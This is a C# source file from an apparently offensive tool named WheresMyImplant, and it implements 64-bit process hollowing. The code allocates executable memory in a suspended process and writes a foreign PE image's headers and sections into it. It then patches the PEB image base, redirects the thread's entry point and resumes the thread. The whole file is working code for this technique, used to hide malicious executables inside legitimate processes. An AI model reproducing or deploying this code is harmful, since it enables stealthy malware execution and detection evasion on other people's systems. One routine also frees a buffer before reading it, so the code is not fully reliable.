using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    partial class HollowProcess
    {
        Winnt.CONTEXT64 context64;
        Winnt._IMAGE_NT_HEADERS64 imageNTHeader64;
        Winnt._IMAGE_NT_HEADERS64 targetNTHeader64;

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean GetContext64()
        {
            context64 = new Winnt.CONTEXT64()
            {
                ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL
            };

            try
            {
                WriteOutputNeutral("Getting Thread Context");
                kernel32.GetThreadContext(lpProcessInformation.hThread, ref context64);
            }
            catch (Exception)
            {
                WriteOutputBad("GetThreadContext (64) Failed");
            }

            WriteOutputNeutral(String.Format("RCX Address: 0x{0}", context64.Rcx.ToString("X4")));
            WriteOutputNeutral(String.Format("RDX Address: 0x{0}", context64.Rdx.ToString("X4")));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean ReadNTHeaders64()
        {
            Int32 nSize = Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64));
            IntPtr buffer = Marshal.AllocHGlobal(nSize);
            UInt32 numberBytesRead = 0;
            try
            {
                if (!kernel32.ReadProcessMemory64(
                    lpProcessInformation.hProcess,
                    (UInt64)targetImageBaseAddress.ToInt64(),
                    buffer,
                    (UInt32)nSize,
                    ref numberBytesRead))
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
            targetNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS64));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage64()
        {
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}",
                image.Length.ToString("X4"),
                targetImageBaseAddress.ToString("X4"),
                (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4"))
            );

            allocatedTargetAddress = kernel32.VirtualAllocEx(
                lpProcessInformation.hProcess,
                new IntPtr((Int64)imageNTHeader64.OptionalHeader.ImageBase),
                imageNTHeader64.OptionalHeader.SizeOfImage,
                kernel32.MEM_COMMIT | kernel32.MEM_RESERVE,
                Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE
            );

            if (IntPtr.Zero == allocatedTargetAddress)
            {
                WriteOutputBad("VirtualAllocEx failed");
                return false;
            }

            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4")));
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess,
                allocatedTargetAddress,
                imagePtr,
                imageNTHeader64.OptionalHeader.SizeOfHeaders,
                ref bytesWritten))
            {
                WriteOutputBad("WriteProcessMemory failed");
                return false;
            }
            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders));

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
            {
                IntPtr offset = new IntPtr(
                    imagePtr.ToInt64() +
                    imageDosHeader.e_lfanew +
                    Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64)) +
                    (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                var imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));

                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                bytesWritten = 0;
                if (!kernel32.WriteProcessMemory(
                    lpProcessInformation.hProcess,
                    new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress),
                    new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData),
                    imageSectionHeader.SizeOfRawData,
                    ref bytesWritten))
                {
                    WriteOutputBad("WriteProcessMemory failed");
                    return false;
                }
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        // http://www.rohitab.com/discuss/topic/43738-getthreadcontext-is-failing/
        // sizeof(CONTEXT) = 1232
        // offsetof(Rdx) = 136 - PEB
        // offsetof(Rcx) = 128 - Entry Point
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess64(Boolean wait)
        {
            WriteOutputNeutral(String.Format("Updating Thread Context"));

            context64.Rcx = (UInt64)allocatedTargetAddress.ToInt64() + imageNTHeader64.OptionalHeader.AddressOfEntryPoint;
            WriteOutputGood(String.Format("Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4")));

            //Updates the PEB
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess,
                new IntPtr((long)context64.Rdx + 16),
                ref imageNTHeader64.OptionalHeader.ImageBase,
                (UInt32)Marshal.SizeOf(imageNTHeader64.OptionalHeader.ImageBase),
                ref bytesWritten))
            {
                WriteOutputBad("WriteProcessMemory failed");
                return false;
            }

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context64));
            Marshal.StructureToPtr(context64, lpContext, false);
            kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);

            WriteOutputNeutral("Resuming Main Thread");
            kernel32.ResumeThread(lpProcessInformation.hThread);

            if (wait)
            {
                kernel32.WaitForSingleObject(lpProcessInformation.hProcess, 0xFFFFFFFF);
            }
            return true;
        }
    }
}
